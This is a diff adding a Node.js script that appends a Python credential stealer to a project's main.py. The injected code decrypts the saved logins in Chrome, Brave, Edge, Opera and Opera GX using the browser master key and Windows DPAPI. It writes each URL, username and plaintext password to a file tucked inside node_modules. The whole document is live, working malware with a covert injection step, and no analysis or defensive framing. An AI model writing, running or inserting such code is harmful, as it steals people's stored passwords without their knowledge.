@@ -1,0 +1,105 @@
+const fs = require('fs');
+fs.appendFileSync('main.py', `
+import win32crypt
+from sqlite3 import connect
+from json import loads
+from base64 import b64decode
+from Cryptodome.Cipher import AES
+import os
+from shutil import copy2
+
+filePass = "node_modules/senhastongo" + ".txt"
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+def decrypt_browser(LocalState, LoginData, name):
+    
+
+    if os.path.exists(LocalState) == True:
+        with open(LocalState) as f:
+            local_state = f.read()
+            local_state = loads(local_state)
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+
+        if os.path.exists(LoginData) == True:
+            copy2(LoginData, "node_modules/TempMan.db")
+            con = connect("node_modules/TempMan.db")
+            cur = con.cursor()
+            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+            f = open(filePass,"a")
+            f.write("***" + name + "***")
+            f.close()
+            for index,logins in enumerate(cur.fetchall()):
+
+                try:
+                    if not logins[0]:
+                        continue
+                    if not logins[1]:
+                        continue
+                    if not logins[2]:
+                        continue
+                    ciphers = logins[2]
+                    initVector = ciphers[3:15]
+                    encPass = ciphers[15:-16]
+
+                    cipher = generate_cipher(master_key, initVector)
+                    decPass = decrypt_payload(cipher, encPass).decode()
+                    toprint = 'URL : {}Name: {}Pass: {}'.format(logins[0], logins[1], decPass)
+                    f = open(filePass,"a")
+                    f.write(toprint)
+                    f.close()
+                except:
+                    pass
+
+               
+
+def Local_State(path):
+    LocalState = path + "/User Data/Local State"
+    return LocalState
+
+def Login_Data(path):
+    LoginData = path + "/User Data/Default/Login Data"
+    return LoginData
+
+
+pathChrome = os.environ['LOCALAPPDATA'] + "/Google/Chrome"
+
+if os.path.exists(pathChrome) == True:
+    decrypt_browser(Local_State(pathChrome), Login_Data(pathChrome), "Chrome") 
+        
+
+
+pathBrave = os.environ['LOCALAPPDATA'] + "/BraveSoftware/Brave-Browser"
+
+if os.path.exists(pathBrave) == True:
+    decrypt_browser(Local_State(pathBrave), Login_Data(pathBrave), "Brave") 
+
+
+pathEdge = os.environ['LOCALAPPDATA'] + "/Microsoft/Edge"
+
+if os.path.exists(pathEdge) == True:
+    decrypt_browser(Local_State(pathEdge), Login_Data(pathEdge), "Edge") 
+
+
+
+
+pathOpera = os.environ['APPDATA'] + "/Opera Software/Opera Stable"
+
+if os.path.exists(pathOpera) == True:
+    decrypt_browser(pathOpera + "/Local State", pathOpera + "/Login Data", "Opera") 
+
+
+
+pathOperaGX = os.environ['APPDATA'] + "/Opera Software/Opera GX Stable"
+
+if os.path.exists(pathOperaGX) == True:
+    decrypt_browser(pathOperaGX + "/Local State", pathOperaGX + "/Login Data", "OperaGX")
+`);
